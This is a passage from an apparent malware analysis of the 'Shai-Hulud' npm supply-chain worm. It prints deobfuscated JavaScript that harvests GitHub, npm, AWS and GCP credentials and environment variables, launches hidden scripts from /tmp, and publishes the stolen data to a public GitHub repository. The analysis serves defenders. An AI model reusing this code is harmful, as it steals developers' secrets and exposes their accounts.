</span></span><span class="line"><span class="cl">            <span class="n">platform</span><span class="p">:</span> <span class="n">t</span><span class="o">.</span><span class="n">platform</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">architecture</span><span class="p">:</span> <span class="n">t</span><span class="o">.</span><span class="n">architecture</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">platformDetailed</span><span class="p">:</span> <span class="n">t</span><span class="o">.</span><span class="n">platformRaw</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">architectureDetailed</span><span class="p">:</span> <span class="n">t</span><span class="o">.</span><span class="n">archRaw</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">environment</span><span class="p">:</span> <span class="n">process</span><span class="o">.</span><span class="n">env</span><span class="p">,</span> <span class="o">//</span> <span class="n">All</span> <span class="n">environment</span> <span class="n">variables</span>
</span></span><span class="line"><span class="cl">        <span class="n">modules</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">github</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">authenticated</span><span class="p">:</span> <span class="n">r_GitHubModule</span><span class="o">.</span><span class="n">isAuthenticated</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">                <span class="n">token</span><span class="p">:</span> <span class="n">r_GitHubModule</span><span class="o">.</span><span class="n">getCurrentToken</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">                <span class="n">username</span><span class="p">:</span> <span class="n">r_GitHubModule</span><span class="o">.</span><span class="n">getUser</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="n">aws</span><span class="p">:</span> <span class="p">{</span> <span class="n">secrets</span><span class="p">:</span> <span class="n">ce_AWS_SECRETS</span> <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="n">gcp</span><span class="p">:</span> <span class="p">{</span> <span class="n">secrets</span><span class="p">:</span> <span class="n">le_GCP_SECRETS</span> <span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="n">truffleHog</span><span class="p">:</span> <span class="n">ae_result</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">npm</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">token</span><span class="p">:</span> <span class="n">re_NPM_TOKEN</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">authenticated</span><span class="p">:</span> <span class="n">ie_authenticated</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">username</span><span class="p">:</span> <span class="n">oe_npmUsername</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="mf">8.</span> <span class="n">CREATE</span> <span class="n">MALICIOUS</span> <span class="n">REPOSITORY</span>
</span></span><span class="line"><span class="cl">    <span class="n">r_GitHubModule</span><span class="o">.</span><span class="n">isAuthenticated</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="n">await</span> <span class="n">r_GitHubModule</span><span class="o">.</span><span class="n">makeRepo</span><span class="p">(</span><span class="s2">&#34;Shai-Hulud&#34;</span><span class="p">,</span> <span class="n">JSON</span><span class="o">.</span><span class="n">stringify</span><span class="p">(</span><span class="n">ue_exfiltration_data</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="mi">2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">process</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">()</span><span class="o">.</span><span class="n">catch</span><span class="p">(</span><span class="n">t</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">process</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="githubmodule">GitHubModule</h5>
<img src="/static/NPM/image-35.png" alt="drawing" width="1000"/>
<img src="/static/NPM/image-39.png" alt="drawing" width="1000"/>
<p>Let&rsquo;s begin with the GitHubModule. The module&rsquo;s main() function first calls isAuthenticated(), which attempts to verify the presence of a valid GitHub token. This function tries to retrieve the token from the GITHUB_TOKEN environment variable. If returns nothing, it falls back to executing the command gh auth token to obtain the token. The getCurrentToken() function simply returns the token.</p>
<img src="/static/NPM/image-31.png" alt="drawing" width="1000"/>
<img src="/static/NPM/image-32.png" alt="drawing" width="1000"/>
<img src="/static/NPM/image-33.png" alt="drawing" width="1000"/>
<p>The get getUser function is responsible for collect the username, email, name, public repositories, followers, following and account creation date of the github account:</p>
<img src="/static/NPM/image-34.png" alt="drawing" width="1000"/>
<p>A particularly notable behavior involves the extraction() and migration() functions. These are responsible for creating and executing the malicious scripts processor.sh and migrate-repos.sh, respectively. The specific details and capabilities of each script will be covered in the next section.</p>
<img src="/static/NPM/image-36.png" alt="drawing" width="1000"/>
<img src="/static/NPM/image-37.png" alt="drawing" width="1000"/>
<p>The getOrgs() function enumerates all organizations the user belongs to.</p>
<img src="/static/NPM/image-38.png" alt="drawing" width="1000"/>
<p>The makeRepo is very interesting, it creates a new public repository named Shai-Hulud with the description &lsquo;Shai-Hulud Repository&rsquo;. This repository contains a single file, data.json, which holds a Base64-encoded data.</p>
<img src="/static/NPM/image-41.png" alt="drawing" width="1000"/>
<p>The last behavior can already be seen on github on some users repositorys:</p>
<img src="/static/NPM/data.png" alt="drawing" width="1000"/>
<p>Full code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">class</span> <span class="n">GitHubModule</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">token</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">getToken</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">octokit</span> <span class="o">=</span> <span class="n">new</span> <span class="n">F</span><span class="o">.</span><span class="n">Octokit</span><span class="p">({</span> <span class="n">auth</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">token</span> <span class="o">||</span> <span class="n">void</span> <span class="mi">0</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">Token</span> <span class="n">harvesting</span> <span class="n">from</span> <span class="n">multiple</span> <span class="n">sources</span>
</span></span><span class="line"><span class="cl">    <span class="n">getToken</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">t</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">env</span><span class="o">.</span><span class="n">GITHUB_TOKEN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="k">return</span> <span class="n">t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">//</span> <span class="n">Steal</span> <span class="n">from</span> <span class="n">GitHub</span> <span class="n">CLI</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">te</span><span class="o">.</span><span class="n">execSync</span><span class="p">)(</span><span class="s2">&#34;gh auth token&#34;</span><span class="p">,</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">                <span class="n">encoding</span><span class="p">:</span> <span class="s2">&#34;utf8&#34;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                <span class="n">stdio</span><span class="p">:</span> <span class="s2">&#34;pipe&#34;</span> 
</span></span><span class="line"><span class="cl">            <span class="p">})</span><span class="o">.</span><span class="n">trim</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="k">return</span> <span class="n">t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">User</span> <span class="n">reconnaissance</span>
</span></span><span class="line"><span class="cl">    <span class="n">async</span> <span class="n">getUser</span><span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">r</span> <span class="o">=</span> <span class="p">(</span><span class="n">t</span> <span class="err">?</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">octokit</span><span class="o">.</span><span class="n">rest</span><span class="o">.</span><span class="n">users</span><span class="o">.</span><span class="n">getByUsername</span><span class="p">({</span> <span class="n">username</span><span class="p">:</span> <span class="n">t</span> <span class="p">})</span> 
</span></span><span class="line"><span class="cl">                         <span class="p">:</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">octokit</span><span class="o">.</span><span class="n">rest</span><span class="o">.</span><span class="n">users</span><span class="o">.</span><span class="n">getAuthenticated</span><span class="p">())</span><span class="o">.</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">login</span><span class="p">:</span> <span class="n">r</span><span class="o">.</span><span class="n">login</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">name</span><span class="p">:</span> <span class="n">r</span><span class="o">.</span><span class="n">name</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">email</span><span class="p">:</span> <span class="n">r</span><span class="o">.</span><span class="n">email</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">publicRepos</span><span class="p">:</span> <span class="n">r</span><span class="o">.</span><span class="n">public_repos</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">followers</span><span class="p">:</span> <span class="n">r</span><span class="o">.</span><span class="n">followers</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">following</span><span class="p">:</span> <span class="n">r</span><span class="o">.</span><span class="n">following</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">createdAt</span><span class="p">:</span> <span class="n">r</span><span class="o">.</span><span class="n">created_at</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">async</span> <span class="n">extraction</span><span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">r</span> <span class="o">=</span> <span class="n">await</span> <span class="n">Promise</span><span class="o">.</span><span class="n">resolve</span><span class="p">()</span><span class="o">.</span><span class="n">then</span><span class="p">(</span><span class="n">n</span><span class="o">.</span><span class="n">t</span><span class="o">.</span><span class="n">bind</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="mi">79896</span><span class="p">,</span> <span class="mi">23</span><span class="p">)),</span> <span class="o">//</span> <span class="n">fs</span> <span class="n">module</span>
</span></span><span class="line"><span class="cl">                  <span class="p">{</span> <span class="n">spawn</span><span class="p">:</span> <span class="n">F</span> <span class="p">}</span> <span class="o">=</span> <span class="n">await</span> <span class="n">Promise</span><span class="o">.</span><span class="n">resolve</span><span class="p">()</span><span class="o">.</span><span class="n">then</span><span class="p">(</span><span class="n">n</span><span class="o">.</span><span class="n">t</span><span class="o">.</span><span class="n">bind</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="mi">35317</span><span class="p">,</span> <span class="mi">23</span><span class="p">)),</span> <span class="o">//</span> <span class="n">child_process</span>
</span></span><span class="line"><span class="cl">                  <span class="n">te</span> <span class="o">=</span> <span class="s2">&#34;/tmp/processor.sh&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                  <span class="n">re</span> <span class="o">=</span> <span class="p">{</span> <span class="o">...</span><span class="n">process</span><span class="o">.</span><span class="n">env</span> <span class="p">},</span>
</span></span><span class="line"><span class="cl">                  <span class="n">oe</span> <span class="o">=</span> <span class="p">[</span><span class="n">t</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">writeFileSync</span><span class="p">(</span><span class="n">te</span><span class="p">,</span> <span class="n">ne</span><span class="p">,</span> <span class="p">{</span> <span class="n">mode</span><span class="p">:</span> <span class="mi">493</span> <span class="p">});</span> <span class="o">//</span> <span class="mi">493</span> <span class="o">=</span> <span class="mi">755</span> <span class="n">permissions</span>
</span></span><span class="line"><span class="cl">            <span class="n">F</span><span class="p">(</span><span class="n">te</span><span class="p">,</span> <span class="n">oe</span><span class="p">,</span> <span class="p">{</span> <span class="n">env</span><span class="p">:</span> <span class="n">re</span><span class="p">,</span> <span class="n">detached</span><span class="p">:</span> <span class="bp">true</span><span class="p">,</span> <span class="n">stdio</span><span class="p">:</span> <span class="s2">&#34;ignore&#34;</span> <span class="p">})</span><span class="o">.</span><span class="n">unref</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">async</span> <span class="n">migration</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">F</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">te</span> <span class="o">=</span> <span class="n">await</span> <span class="n">Promise</span><span class="o">.</span><span class="n">resolve</span><span class="p">()</span><span class="o">.</span><span class="n">then</span><span class="p">(</span><span class="n">n</span><span class="o">.</span><span class="n">t</span><span class="o">.</span><span class="n">bind</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="mi">79896</span><span class="p">,</span> <span class="mi">23</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">              <span class="p">{</span> <span class="n">spawn</span><span class="p">:</span> <span class="n">ne</span> <span class="p">}</span> <span class="o">=</span> <span class="n">await</span> <span class="n">Promise</span><span class="o">.</span><span class="n">resolve</span><span class="p">()</span><span class="o">.</span><span class="n">then</span><span class="p">(</span><span class="n">n</span><span class="o">.</span><span class="n">t</span><span class="o">.</span><span class="n">bind</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="mi">35317</span><span class="p">,</span> <span class="mi">23</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">n</span> <span class="o">=</span> <span class="s2">&#34;/tmp/migrate-repos.sh&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">te</span><span class="o">.</span><span class="n">writeFileSync</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="p">{</span> <span class="n">mode</span><span class="p">:</span> <span class="mi">493</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">oe</span> <span class="o">=</span> <span class="s2">&#34;/tmp/github-migration&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">te</span><span class="o">.</span><span class="n">mkdirSync</span><span class="p">(</span><span class="n">oe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">ie</span> <span class="o">=</span> <span class="p">{</span> <span class="o">...</span><span class="n">process</span><span class="o">.</span><span class="n">env</span> <span class="p">},</span>
</span></span><span class="line"><span class="cl">                  <span class="n">se</span> <span class="o">=</span> <span class="n">ne</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="p">[</span><span class="n">r</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">F</span><span class="p">],</span> <span class="p">{</span> <span class="n">env</span><span class="p">:</span> <span class="n">ie</span><span class="p">,</span> <span class="n">detached</span><span class="p">:</span> <span class="bp">true</span><span class="p">,</span> <span class="n">stdio</span><span class="p">:</span> <span class="s2">&#34;ignore&#34;</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">se</span><span class="o">.</span><span class="n">unref</span><span class="p">(),</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">success</span><span class="p">:</span> <span class="bp">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">message</span><span class="p">:</span> <span class="s2">&#34;Migration started in background&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">pid</span><span class="p">:</span> <span class="n">se</span><span class="o">.</span><span class="n">pid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">tempScript</span><span class="p">:</span> <span class="n">n</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">tempDir</span><span class="p">:</span> <span class="n">oe</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">success</span><span class="p">:</span> <span class="bp">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">error</span><span class="p">:</span> <span class="n">t</span> <span class="n">instanceof</span> <span class="n">Error</span> <span class="err">?</span> <span class="n">t</span><span class="o">.</span><span class="n">message</span> <span class="p">:</span> <span class="s2">&#34;Unknown error occurred&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">message</span><span class="p">:</span> <span class="s2">&#34;Migration failed to start&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">makeRepo</span><span class="p">(</span><span class="n">repoName</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">response</span> <span class="o">=</span> <span class="p">(</span><span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">octokit</span><span class="o">.</span><span class="n">rest</span><span class="o">.</span><span class="n">repos</span><span class="o">.</span><span class="n">createForAuthenticatedUser</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="n">name</span><span class="p">:</span> <span class="n">repoName</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">description</span><span class="p">:</span> <span class="s1">&#39;Shai-Hulud Repository.&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">private</span><span class="p">:</span> <span class="bp">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">auto_init</span><span class="p">:</span> <span class="bp">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">has_issues</span><span class="p">:</span> <span class="bp">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">has_projects</span><span class="p">:</span> <span class="bp">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">has_wiki</span><span class="p">:</span> <span class="bp">false</span>
</span></span><span class="line"><span class="cl">      <span class="p">}))</span><span class="o">.</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="o">//</span> <span class="n">wait</span><span class="o">-</span><span class="n">ish</span> <span class="p">(</span><span class="n">original</span> <span class="n">had</span> <span class="n">a</span> <span class="mi">3</span><span class="n">s</span> <span class="n">setTimeout</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">await</span> <span class="n">new</span> <span class="n">Promise</span><span class="p">(</span><span class="n">resolve</span> <span class="o">=&gt;</span> <span class="n">setTimeout</span><span class="p">(</span><span class="n">resolve</span><span class="p">,</span> <span class="mi">3000</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">Base64</span> <span class="o">=</span> <span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">octokit</span><span class="o">.</span><span class="n">rest</span><span class="o">.</span><span class="n">repos</span><span class="o">.</span><span class="n">createOrUpdateFileContents</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">          <span class="n">owner</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">owner</span><span class="o">.</span><span class="n">login</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">repo</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">name</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">path</span><span class="p">:</span> <span class="s1">&#39;data.json&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">message</span><span class="p">:</span> <span class="s1">&#39;Initial commit&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">content</span><span class="p">:</span> <span class="n">Base64</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">owner</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">owner</span><span class="o">.</span><span class="n">login</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">repo</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">name</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">html_url</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">description</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">description</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">stars</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">stargazers_count</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">forks</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">forks_count</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">language</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">language</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">createdAt</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">created_at</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">updatedAt</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">updated_at</span>
</span></span><span class="line"><span class="cl">      <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">isAuthenticated</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">!!</span><span class="n">this</span><span class="o">.</span><span class="n">token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
